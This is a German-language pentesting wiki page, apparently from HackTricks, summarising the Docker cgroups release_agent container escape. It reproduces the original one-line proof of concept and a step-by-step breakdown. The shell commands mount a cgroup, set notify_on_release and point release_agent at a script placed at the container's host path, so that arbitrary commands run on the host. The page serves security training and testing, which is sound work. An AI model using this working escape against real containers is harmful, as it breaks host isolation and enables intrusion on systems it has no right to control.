# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Für weitere Details siehe den** [**originalen Blogbeitrag**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Dies ist nur eine Zusammenfassung:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Der Proof of Concept (PoC) demonstriert eine Methode, um cgroups auszunutzen, indem eine `release_agent`-Datei erstellt und deren Aufruf ausgelöst wird, um beliebige Befehle auf dem Container-Host auszuführen. Hier ist eine Aufschlüsselung der beteiligten Schritte:

1. **Umgebung vorbereiten:**
- Ein Verzeichnis `/tmp/cgrp` wird erstellt, um als Mount-Punkt für die cgroup zu dienen.
- Der RDMA cgroup-Controller wird in dieses Verzeichnis gemountet. Im Falle des Fehlens des RDMA-Controllers wird empfohlen, den `memory` cgroup-Controller als Alternative zu verwenden.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Richten Sie die Kind-Cgroup ein:**
- Eine Kind-Cgroup mit dem Namen "x" wird im gemounteten Cgroup-Verzeichnis erstellt.
- Benachrichtigungen sind für die "x" Cgroup aktiviert, indem 1 in die Datei notify_on_release geschrieben wird.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Konfigurieren Sie den Release-Agent:**
- Der Pfad des Containers auf dem Host wird aus der Datei /etc/mtab abgerufen.
- Die release_agent-Datei der cgroup wird dann so konfiguriert, dass sie ein Skript mit dem Namen /cmd ausführt, das sich am erlangten Host-Pfad befindet.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Erstellen und Konfigurieren des /cmd-Skripts:**
- Das /cmd-Skript wird im Container erstellt und so konfiguriert, dass es ps aux ausführt und die Ausgabe in eine Datei namens /output im Container umleitet. Der vollständige Pfad von /output auf dem Host wird angegeben.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Angriff auslösen:**
- Ein Prozess wird innerhalb der "x" Kind-Cgroup gestartet und sofort beendet.
- Dies löst den `release_agent` (das /cmd-Skript) aus, der ps aux auf dem Host ausführt und die Ausgabe in /output innerhalb des Containers schreibt.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
